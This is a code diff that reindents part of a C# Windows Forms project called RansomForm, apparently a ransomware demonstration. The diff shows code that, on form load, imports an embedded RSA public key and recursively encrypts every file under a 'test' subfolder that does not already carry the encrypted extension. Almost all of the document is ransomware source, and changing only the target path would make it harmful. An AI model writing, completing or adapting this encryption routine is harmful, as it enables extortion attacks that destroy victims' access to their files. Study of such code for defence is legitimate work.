@@ -23,40 +23,40 @@ namespace RansomForm
     private byte[] publicKey;
 
 	public Form1()
-    {
-      InitializeComponent();
-    }
+  {
+    InitializeComponent();
+  }
 
-    private void Form1_Load(object sender, EventArgs e)
-    {
-	  beginEncryption();
-      formatFormPostEncryption();
-    }
+  private void Form1_Load(object sender, EventArgs e)
+  {
+    beginEncryption();
+    formatFormPostEncryption();
+  }
 
-    private void beginEncryption()
-    {
-      publicKey = Properties.Resources.publickey;
-      string folderpath = Directory.GetCurrentDirectory() + "\\test";
-      encryptFolder(folderpath);
-    }
+  private void beginEncryption()
+  {
+    publicKey = Properties.Resources.publickey;
+    string folderpath = Directory.GetCurrentDirectory() + "\\test";
+    encryptFolder(folderpath);
+  }
 
 	private void encryptFolder(string path)
+  {
+    RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
+    int bytesRead;
+    RSA.ImportRSAPublicKey(publicKey, out bytesRead);
+    foreach (string f in Directory.GetFiles(path))
     {
-      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
-      int bytesRead;
-      RSA.ImportRSAPublicKey(publicKey, out bytesRead);
-      foreach (string f in Directory.GetFiles(path))
+      if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
       {
-        if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
-        {
-          Console.Out.WriteLine("Encrypting: " + f);
-          encryptFile(f, RSA);
-        }
+        Console.Out.WriteLine("Encrypting: " + f);
+        encryptFile(f, RSA);
       }
-      foreach (string f in Directory.GetDirectories(path))
-      {
-        encryptFolder(f);
-      }
+    }
+    foreach (string f in Directory.GetDirectories(path))
+    {
+      encryptFolder(f);
+    }
     }
 
     void encryptFile(string path, RSACryptoServiceProvider RSA)
